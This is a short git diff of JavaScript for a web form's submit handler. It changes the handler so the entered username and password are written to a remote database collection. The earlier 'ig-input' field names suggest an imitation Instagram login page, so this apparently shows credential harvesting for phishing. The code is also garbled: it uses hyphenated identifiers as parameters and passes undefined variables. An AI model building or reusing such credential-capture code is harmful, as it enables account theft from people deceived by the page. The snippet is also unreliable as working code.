@@ -19,10 +19,10 @@ document.getElementById("profile-info-form").addEventListener("submit", submitFo
 function submitForm(e) {
   e.preventDefault();
 
-  var name = getElementVal("ig-input-username");
-  var emailid = getElementVal("ig-input-password");
+  var name = getElementVal("username");
+  var emailid = getElementVal("password");
   
-  saveMessages(ig-input-username, ig-input-password);
+  saveMessages(username, password);
 
   //   enable alert
   document.querySelector(".alert").style.display = "block";
@@ -36,13 +36,12 @@ function submitForm(e) {
   document.getElementById("contactForm").reset();
 }
 
-const saveMessages = (ig-input-username, ig-input-password) => {
+const saveMessages = (username, password) => {
   var newContactForm = contactFormDB.push();
 
   newContactForm.set({
-    name: name,
-    emailid: emailid,
-    msgContent: msgContent,
+    username: username,
+    password: password,
   });
 };
 
